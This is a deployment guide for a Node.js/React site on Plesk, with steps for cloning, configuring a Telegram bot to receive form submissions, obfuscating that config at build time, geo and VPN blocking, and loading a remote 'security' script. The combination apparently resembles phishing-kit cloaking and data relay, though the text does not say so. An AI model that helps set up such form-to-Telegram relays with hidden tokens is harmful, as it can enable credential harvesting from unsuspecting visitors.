# Deployment Guide: Plesk with Node.js

## Prerequisites

- Plesk server with Node.js support enabled
- Domain: `test.ibtips.com`
- SSH access or Plesk File Manager
- Git access to repository

## Step 1: Clone Repository

### Via SSH:
```bash
cd /var/www/vhosts/ibtips.com/test.ibtips.com
git clone https://github.com/anach-ai/future.git future
cd future
```

**OR** clone directly to current directory:
```bash
cd /var/www/vhosts/ibtips.com/test.ibtips.com
git clone https://github.com/anach-ai/future.git .
```

### Via Plesk:
1. Go to **Files** → **File Manager**
2. Navigate to `test.ibtips.com` directory
3. Use **Git** extension to clone repository
4. Repository URL: `https://github.com/anach-ai/future.git`
5. **Important**: If cloned into subdirectory, navigate into it or move files to root

## Step 2: Configure Application

1. **Edit Telegram Config:**
   ```bash
   nano public/config/user-telegram-config.json
   ```
   - Replace `YOUR_BOT_TOKEN_HERE` with your Telegram bot token
   - Replace `YOUR_CHAT_ID_HERE` with your Telegram chat ID

2. **Edit Security Rules:**
   ```bash
   nano agent/config/dk_rules.json
   ```
   - Configure country restrictions
   - Set VPN/proxy blocking rules
   - Configure rate limiting

## Step 3: Install Dependencies

### Via SSH:
**If cloned into subdirectory:**
```bash
cd /var/www/vhosts/ibtips.com/test.ibtips.com/future
npm install
```

**If cloned to root:**
```bash
cd /var/www/vhosts/ibtips.com/test.ibtips.com
npm install
```

### Via Plesk Node.js:
1. Go to **Node.js** in Plesk
2. Set **Application root**: `/future` (if in subdirectory) or `/` (if in root)
3. Set **Application startup file**: `server.js`
4. Click **Enable Node.js**
5. Run in terminal (from correct directory):
   ```bash
   npm install
   ```

## Step 4: Build Application

**Make sure you're in the correct directory first:**
```bash
# If in subdirectory:
cd /var/www/vhosts/ibtips.com/test.ibtips.com/future

# Then build:
npm run build
```

This will:
- Obfuscate Telegram config automatically
- Create production build in `dist/` folder

## Step 5: Configure Plesk Node.js

1. **Plesk → Node.js**
2. **Application root**: 
   - If in subdirectory: `/future`
   - If in root: `/`
3. **Application startup file**: `server.js`
4. **Application URL**: `/`
5. **Node.js version**: Select latest LTS
6. **Enable Node.js**: ✓

## Step 6: Create Server File (if needed)

Create `server.js` in root:

```javascript
const express = require('express');
const path = require('path');
const app = express();
const port = process.env.PORT || 3050;

// Serve static files from dist folder
app.use(express.static(path.join(__dirname, 'dist')));

// Handle React routing - return all requests to React app
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
```

## Step 7: Install Express (if using server.js)

```bash
npm install express
```

## Step 8: Alternative - Use Plesk Static Files

If you prefer not to use Node.js server:

1. **Build the app:**
   ```bash
   npm run build
   ```

2. **Copy dist/ contents to httpdocs:**
   ```bash
   cp -r dist/* httpdocs/
   ```

3. **Configure .htaccess** for React routing (if using Apache)

## Step 9: Test Application

1. Visit: `https://test.ibtips.com`
2. Check browser console for errors
3. Verify external security loads from `https://up.ibtips.com`
4. Test form submissions
5. Verify Telegram notifications

## Troubleshooting

### Node.js not starting:
- Check **Application root** path in Plesk
- Verify `package.json` exists
- Check Node.js version compatibility

### Build fails:
- Ensure all dependencies installed: `npm install`
- Check Node.js version: `node --version` (should be 16+)

### External security not loading:
- Verify `https://up.ibtips.com/external-security-loader.js` is accessible
- Check browser console for CORS errors
- Verify external files are uploaded to ibtips.com

### Port conflicts:
- Default port: 3050 (as per user preference)
- Change in `server.js` if needed
- Or use Plesk's port configuration

## Quick Commands Reference

```bash
# Navigate to app directory
cd /var/www/vhosts/test.ibtips.com/httpdocs

# Install dependencies
npm install

# Build for production
npm run build

# Start development server (if needed)
npm run dev

# Check Node.js version
node --version

# Check npm version
npm --version
```

## File Structure After Deployment

```
httpdocs/
├── agent/
│   └── config/
│       └── dk_rules.json          # Security rules
├── public/
│   └── config/
│       └── user-telegram-config.json  # Telegram config
├── dist/                          # Production build (after npm run build)
│   ├── index.html
│   └── assets/
├── package.json
├── server.js                      # Node.js server (if using)
└── .htaccess                      # Apache config (if using static files)
```

